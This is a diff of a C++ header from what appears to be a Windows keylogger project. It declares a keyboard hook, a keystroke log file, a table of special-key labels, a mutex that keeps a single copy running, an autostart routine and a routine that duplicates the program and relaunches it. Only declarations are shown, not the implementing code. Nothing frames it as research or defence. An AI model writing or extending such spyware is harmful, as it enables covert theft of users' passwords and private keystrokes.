@@ -1,22 +1,20 @@
 #pragma once
 
+#include <array>
 #include <filesystem>
-#include <fstream>
-#include <map>
-#include <thread>
+#include <unordered_map>
 #include <Windows.h>
-#include <lmcons.h>
-#include <ShlObj.h>
 
-class c_keylogger
+class keylogger
 {
 public:
-    c_keylogger();
+    keylogger();
+    ~keylogger();
 
     const HHOOK hook() const { return m_hook; }
 
     WPARAM run() const;
-    void process_key(int code) const;
+    void process_key(uint32_t code);
 
 private:
     void create_log();
@@ -24,14 +22,17 @@ private:
 
     void set_autostart();
     void start_duplicate_and_exit() const;
+    void ensure_single_instance();
 
     void update_time() const;
     void update_window() const;
 
     HHOOK m_hook{ };
+    HANDLE m_mutex{ };
+    std::array<uint8_t, 256> m_keys{ };
     std::filesystem::path m_log_path{ };
     std::filesystem::path m_duplicate_path{ };
-    const std::map<int, std::wstring_view> m_special_keys{
+    const std::unordered_map<uint32_t, std::wstring_view> m_special_keys{
         { VK_BACK, L" [BACKSPACE] "},
         { VK_RETURN, L" [RETURN] "},
         { VK_SPACE, L" [SPACE] "},
@@ -62,6 +63,4 @@ private:
         { VK_SUBTRACT, L" [-] "},
         { VK_CAPITAL, L" [CAPSLOCK] "}
     };
-};
-
-inline std::unique_ptr<c_keylogger> logger{ };
+} inline g_logger{ };
